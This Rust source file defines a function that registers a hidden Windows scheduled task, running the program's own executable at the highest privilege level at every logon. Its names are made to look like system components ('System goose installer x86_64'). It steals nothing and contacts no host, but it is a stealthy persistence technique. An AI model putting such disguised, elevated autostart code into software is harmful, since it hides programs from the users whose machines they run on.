use crate::*;
use std::env::current_exe;
use std::time::Duration;
use windows_taskscheduler::*;

pub fn startup_schedule() {
    // Other interesant way to do it: Create a msconfig/serice and set it to auto-start

    let trigger = TaskLogonTrigger::new("System goose trigger x86_64", Duration::from_secs(15));

    let action = TaskAction::new(
        "System goose action x86_64",
        current_exe().unwrap().into_os_string().to_str().unwrap(),
        root_folder().unwrap().into_os_string().to_str().unwrap(),
        "",
    );

    Task::new(r"\")
        .unwrap()
        .logon_trigger(trigger)
        .unwrap()
        .exec_action(action)
        .unwrap()
        .principal(RunLevel::HIGHEST, "", "")
        .unwrap()
        .set_hidden(true)
        .unwrap()
        .register("System goose installer x86_64")
        .unwrap();
}
